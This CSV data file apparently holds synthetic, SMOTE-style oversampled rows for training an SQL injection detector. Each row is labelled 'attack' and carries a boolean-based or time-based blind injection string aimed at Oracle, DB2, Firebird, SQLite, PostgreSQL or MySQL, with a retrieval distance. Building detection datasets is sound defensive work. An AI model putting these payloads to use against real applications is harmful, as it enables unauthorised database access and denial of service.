id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000012,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000890,0.017838304858750667
SMOTE_000013,attack,boolean,"-9779'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'hmzj'  =  'hmzj",nearest_attack_euclidean,R000412,0.037890463327565606
SMOTE_000014,attack,boolean,1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,nearest_attack_euclidean,R000445,0.13465467088475344
SMOTE_000015,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000657,0.49894305687387314
SMOTE_000016,attack,boolean,"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001079,0.008218981128270577
SMOTE_000017,attack,boolean,"1""  )   as rqpp where 9383  =  9383 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000165,0.27838104144961484
SMOTE_000018,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000183,0.2935130838574322
SMOTE_000019,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001157,0.27362469180512006
SMOTE_000020,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R001145,1.1151234157374241
SMOTE_000021,attack,boolean,"1' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001348,0.21294714806296783
SMOTE_000022,attack,boolean,"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001288,0.19504169858137718
SMOTE_000023,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'qgdv'  =  'qgdv",nearest_attack_euclidean,R001343,0.7474381747905998
SMOTE_000024,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R001536,0.345584555258983
SMOTE_000025,attack,boolean,"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001320,0.07355552652115867
SMOTE_000026,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000088,1.1445733853207936
SMOTE_000027,attack,boolean,"1""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001530,0.6822544948338698
SMOTE_000028,attack,boolean,"1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001181,1.0027672341512806
SMOTE_000029,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'ahjo'  =  'ahjo",nearest_attack_euclidean,R000318,1.5968958686779162
SMOTE_000030,attack,boolean,"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",nearest_attack_euclidean,R001404,0.10983606266599791
SMOTE_000031,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000356,0.2225920632891144
SMOTE_000032,attack,boolean,"1"" where 6111  =  6111 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000617,0.27973241932172277
SMOTE_000033,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R001390,0.07124277278472319
SMOTE_000034,attack,boolean,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,nearest_attack_euclidean,R000088,0.9954987101288303
SMOTE_000035,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000270,0.18225598810561683
SMOTE_000036,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R000388,0.07864110972891282
SMOTE_000037,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000450,0.4973069859907119
SMOTE_000038,attack,boolean,"1 where 8908  =  8908 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R001454,0.13697414015463985
SMOTE_000039,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001227,0.5502113750700509
SMOTE_000040,attack,boolean,"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000613,0.1858770227908832
SMOTE_000041,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",nearest_attack_euclidean,R001065,1.333943718070934
SMOTE_000042,attack,boolean,1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',nearest_attack_euclidean,R000775,0.3453362018434332
SMOTE_000043,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000060,0.2985079427466486
SMOTE_000044,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",nearest_attack_euclidean,R000563,0.12803945489148955
SMOTE_000045,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx",nearest_attack_euclidean,R001223,0.32952528426176125
SMOTE_000046,attack,boolean,"1"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000458,0.3674437272249258
SMOTE_000047,attack,boolean,"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000222,0.3607100509918569
SMOTE_000048,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001187,0.18871647473857878
SMOTE_000049,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000991,0.14822017556897443
SMOTE_000050,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000173,0.5034270395927553
SMOTE_000051,attack,boolean,"1""  )   as qjyu where 2679  =  2679 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000394,0.027773585613239903
SMOTE_000052,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000772,0.8624187627285733
SMOTE_000053,attack,boolean,"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000639,0.001051234255671067
SMOTE_000054,attack,boolean,"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",nearest_attack_euclidean,R000616,0.026894242803897427
SMOTE_000055,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""mpxd"" like ""mpxd",nearest_attack_euclidean,R001044,0.04256403465361648
SMOTE_000056,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001227,0.5477916684165752
SMOTE_000057,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001467,0.08105341590282229
SMOTE_000058,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000067,0.808870384463171
SMOTE_000059,attack,boolean,"1'  )   as noqp where 4042  =  4042 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000580,0.42565544415454887
SMOTE_000060,attack,boolean,"1'  )   where 5317  =  5317 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000830,0.16399243808323494
SMOTE_000061,attack,boolean,"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000537,0.13407680641890937
SMOTE_000062,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000212,0.018139206078968236
SMOTE_000063,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001487,0.00904138240968876
SMOTE_000064,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001046,0.011342638105129886
SMOTE_000065,attack,boolean,"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R000978,0.4462303257511661
SMOTE_000066,attack,boolean,"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R000862,0.14047774011305117
SMOTE_000067,attack,boolean,"-8686"" where 4532  =  4532 or elt  (  3301  =  9065,9065  )  --",nearest_attack_euclidean,R000747,0.39117573448146564
SMOTE_000068,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000836,0.2025192434706312
SMOTE_000069,attack,boolean,"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000271,0.2023892017089361
SMOTE_000070,attack,boolean,"-1964'  )   as ihsp where 6379  =  6379 or elt  (  6945  =  6165,6165  )  --",nearest_attack_euclidean,R000726,0.6951827583314014
SMOTE_000071,attack,boolean,"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000794,0.6683729096886547
SMOTE_000072,attack,boolean,"1' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000860,0.45268129432832266
SMOTE_000073,attack,boolean,"1""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000811,0.727989187717843
SMOTE_000074,attack,boolean,"-1425""  )   where 8056  =  8056 or elt  (  1032  =  1032,3623  )  --",nearest_attack_euclidean,R000129,0.26146946470750754
SMOTE_000075,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000315,0.08090325198383527
SMOTE_000076,attack,boolean," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000006,1.183794302515301
SMOTE_000077,attack,boolean,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R001310,0.16705999128373294
SMOTE_000078,attack,boolean,"1'   )    )     )   and elt  (  9501  =  8427,8427  )   and    (    (     (  'ahpp'  =  'ahpp",nearest_attack_euclidean,R000352,0.0011889795507293588
SMOTE_000079,attack,boolean,"1 where 4319  =  4319 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000835,0.046752054022284044
SMOTE_000080,attack,boolean,"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R001115,0.579710427179105
SMOTE_000081,attack,boolean,"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",nearest_attack_euclidean,R001151,0.2834060684974111
SMOTE_000082,attack,boolean,1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',nearest_attack_euclidean,R000228,0.05881948270281146
SMOTE_000083,attack,boolean,"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R000978,0.44932416143066634
SMOTE_000084,attack,boolean,1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,nearest_attack_euclidean,R001232,0.19173768056638224
SMOTE_000085,attack,boolean,"1'   )    )     )   and elt  (  2506  =  2383,2383  )   and    (    (     (  'bjrj'  =  'bjrj",nearest_attack_euclidean,R000897,0.0862461587243736
SMOTE_000086,attack,boolean,"1  )   where 8856  =  8856 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000894,0.17695612724219423
SMOTE_000087,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R001187,0.3008617356340423
SMOTE_000088,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000071,0.43832661096537345
SMOTE_000089,attack,boolean,"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",nearest_attack_euclidean,R000871,0.4747432466787375
SMOTE_000090,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000717,0.0738629422391817
SMOTE_000091,attack,boolean,"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""jydy"" like ""jydy",nearest_attack_euclidean,R001053,1.2272658878472635
SMOTE_000092,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000249,0.486567908136928
SMOTE_000093,attack,boolean,"1""  )   where 7578  =  7578 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000693,0.09951807388813591
SMOTE_000094,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001189,0.35756221624894113
SMOTE_000095,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001503,0.28040962188397095
SMOTE_000096,attack,boolean,"1   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   7200  =  7200",nearest_attack_euclidean,R000615,0.04856843791093873
SMOTE_000097,attack,boolean,"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000492,0.2530874662205916
SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000001,0.0
SMOTE_000099,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",nearest_attack_euclidean,R000982,0.21897489775190582
SMOTE_000100,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",nearest_attack_euclidean,R001311,0.2623843777491534
SMOTE_000101,attack,boolean,"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000503,0.7703054689810618
SMOTE_000102,attack,boolean,1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||',nearest_attack_euclidean,R000837,0.5164684927635367
SMOTE_000103,attack,boolean,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,nearest_attack_euclidean,R000007,0.7605373153896037
SMOTE_000104,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000983,0.12212878014684886
SMOTE_000105,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001178,0.6091123834799267
SMOTE_000106,attack,boolean,-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,nearest_attack_euclidean,R001337,1.0111206561983572
SMOTE_000107,attack,boolean,-9555'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'rwpq' like 'rwpq,nearest_attack_euclidean,R000444,0.44882554790386686
SMOTE_000108,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000646,0.3239262561143575
SMOTE_000109,attack,boolean,"1%""   )    )     )   and 7758  =  4792 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000651,0.8874587510793608
SMOTE_000110,attack,boolean,1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000455,0.3634584729480928
SMOTE_000111,attack,boolean,"1' in boolean mode  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001422,0.051198071000097066
SMOTE_000112,attack,boolean,"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'bwrb' like 'bwrb",nearest_attack_euclidean,R001395,0.2291663724528809
SMOTE_000113,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R001200,1.335706675528369
SMOTE_000114,attack,boolean,"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000719,0.20546412608768858
SMOTE_000115,attack,boolean,"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""liar""  =  ""liar",nearest_attack_euclidean,R000369,0.9004570126929726
SMOTE_000116,attack,boolean,"1' where 7190  =  7190 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001082,0.5000020017138033
SMOTE_000117,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf",nearest_attack_euclidean,R000576,0.02911453146944531
SMOTE_000118,attack,boolean,"1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",nearest_attack_euclidean,R001136,0.448006960749217
SMOTE_000119,attack,boolean,"-2568""  )   or   (  8459  =  8459  )  *4906 and   (  ""exyw""  =  ""exyw",nearest_attack_euclidean,R001125,0.8308661916969947
SMOTE_000120,attack,boolean,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'dubu' like 'dubu",nearest_attack_euclidean,R001477,0.25133960588186194
SMOTE_000121,attack,boolean,"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",nearest_attack_euclidean,R000058,1.000462823880548
SMOTE_000122,attack,boolean,"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000701,0.004856414612950681
SMOTE_000123,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R000519,1.2019600452702985
SMOTE_000124,attack,boolean,"1""  )   where 5850  =  5850 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000971,0.2992841633813509
SMOTE_000125,attack,boolean,"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",nearest_attack_euclidean,R000529,0.06894700361148197
SMOTE_000126,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.34731186877351267
SMOTE_000127,attack,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000019,0.0
SMOTE_000128,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000001,0.0
SMOTE_000129,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000215,0.17576662048335845
SMOTE_000130,attack,boolean,"1  )   where 9012  =  9012 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000895,0.31710719382928787
SMOTE_000131,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001158,0.4930484423722005
SMOTE_000132,attack,boolean,"1%'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000359,0.24249754496670248
SMOTE_000133,attack,boolean,1%'   )    )    and   (  8853  =  9924  )  *9924 and    (    (   '%'  =  ',nearest_attack_euclidean,R000775,0.13623026063546892
SMOTE_000134,attack,boolean,"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",nearest_attack_euclidean,R000987,0.10048654950680422
SMOTE_000135,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000322,0.03791166769240884
SMOTE_000136,attack,boolean,"1%'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000179,0.09943956006882744
SMOTE_000137,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000403,0.7443509101579034
SMOTE_000138,attack,boolean,"1""   )    )    as phis where 4420  =  4420 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000873,0.19998265210864594
